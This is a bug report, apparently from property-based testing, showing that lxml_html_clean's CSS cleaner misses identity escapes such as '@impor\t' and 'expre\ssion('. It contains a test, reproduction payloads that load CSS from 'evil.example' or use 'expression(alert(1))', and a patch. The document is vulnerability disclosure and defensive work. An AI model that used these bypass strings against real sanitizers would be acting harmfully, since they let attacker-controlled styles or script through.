# Bug Report: lxml_html_clean.clean CSS identity escapes bypass `@import` / `expression(` filtering

**Target**: `lxml_html_clean.clean.Cleaner._has_sneaky_javascript` / `_decode_css_unicode_escapes`
**Severity**: High
**Bug Type**: Logic
**Date**: 2026-10-05

## Summary

`_decode_css_unicode_escapes` claims to "prevent bypassing security checks using CSS escape sequences". It only decodes hex escapes (`\69`). It leaves out CSS "identity" escapes: a backslash followed by any non-hex character, which the CSS tokenizer reads as that character (CSS Syntax §4.3.7). So `@impor\t` and `expre\ssion(` pass the cleaner unchanged in `<style>` elements and in `style` attributes, while the equivalent hex forms (`@\69mport`, `expre\73sion(`) are blocked.

## Property-Based Test

```python
import re
from hypothesis import given, settings, strategies as st
from lxml_html_clean import Cleaner, clean_html

HEX = "0123456789abcdefABCDEF"

def css_escape_char(c, mode):
    if mode == 0:
        return c
    if mode == 1:
        return "\\%x " % ord(c)
    if mode == 2:
        return "\\%06x" % ord(c)
    if c in HEX:
        return "\\%x " % ord(c)
    return "\\" + c

@st.composite
def css_obfuscated(draw, word):
    modes = draw(st.lists(st.integers(0, 3), min_size=len(word), max_size=len(word)))
    return "".join(css_escape_char(c, m) for c, m in zip(word, modes))

@settings(max_examples=500)
@given(st.data())
def test_style_tag_escaped_import_or_expression_removed(data):
    word = data.draw(st.sampled_from(["expression", "import"]))
    obf = data.draw(css_obfuscated(word))
    if word == "import":
        css = "@%s url(http://evil.example/x.css);" % obf
    else:
        css = "a { width: %s(alert(1)); }" % obf
    html = "<div><style>%s</style><p>x</p></div>" % css
    out = clean_html(html)
    style_text = out.split("<style>")[1].split("</style>")[0] if "<style>" in out else ""
    decoded = Cleaner()._decode_css_unicode_escapes(style_text)
    decoded = re.sub(r"\\([^0-9a-fA-F\n])", r"\1", decoded).lower()
    assert "@import" not in decoded and "expression(" not in decoded, (html, out)
```

**Failing input**: `obf = 'impor\\t'`, i.e. `<div><style>@impor\t url(http://evil.example/x.css);</style><p>x</p></div>`

## Reproducing the Bug

```python
from lxml.html import defs
from lxml_html_clean import Cleaner, clean_html

print(clean_html('<div><style>@\\69mport url(http://evil.example/x.css);</style></div>'))
print(clean_html('<div><style>@impor\\t url(http://evil.example/x.css);</style></div>'))
print(clean_html('<div><style>a{width:expre\\ssion(alert(1))}</style></div>'))

c = Cleaner(safe_attrs=defs.safe_attrs | {'style'})
print(c.clean_html('<p style="width:expre\\73sion(alert(1))">x</p>'))
print(c.clean_html('<p style="width:expre\\ssion(alert(1))">x</p>'))
```

Output:

```
<div><style>/* deleted */</style></div>
<div><style>@impor\t url(http://evil.example/x.css);</style></div>
<div><style>a{width:expre\ssion(alert(1))}</style></div>
<p>x</p>
<p style="width:expre\ssion(alert(1))">x</p>
```

## Why This Is A Bug

The cleaner says it removes `@import` from stylesheets ("The imported CSS can do anything; we just can't allow" it) and removes `expression(...)`. The docstring of `_decode_css_unicode_escapes` explicitly says its job is to stop people from getting around these checks with CSS escapes. In CSS, `\t` outside a string is the identifier character `t`, so `@impor\t` *is* `@import` to a browser. The same goes for `expre\ssion` and `expression`. The hex variants are blocked, but these equivalent spellings get through untouched. That is an incomplete fix for the escape bypass, and it lets attacker-controlled external stylesheets (or IE `expression()`) through the default `clean_html`.

## Fix

```diff
--- a/lxml_html_clean/clean.py
+++ b/lxml_html_clean/clean.py
@@
     _css_unicode_escape_re = re.compile(r'\\([0-9a-fA-F]{1,6})\s?')
+    _css_identity_escape_re = re.compile(r'\\([^0-9a-fA-F\r\n\f])')
 
     def _decode_css_unicode_escapes(self, style):
@@
-        return self._css_unicode_escape_re.sub(replace_escape, style)
+        style = self._css_unicode_escape_re.sub(replace_escape, style)
+        return self._css_identity_escape_re.sub(r'\1', style)
```

(I checked this by monkeypatching: all the bypass inputs above become `/* deleted */` or have the `style` attribute removed.)
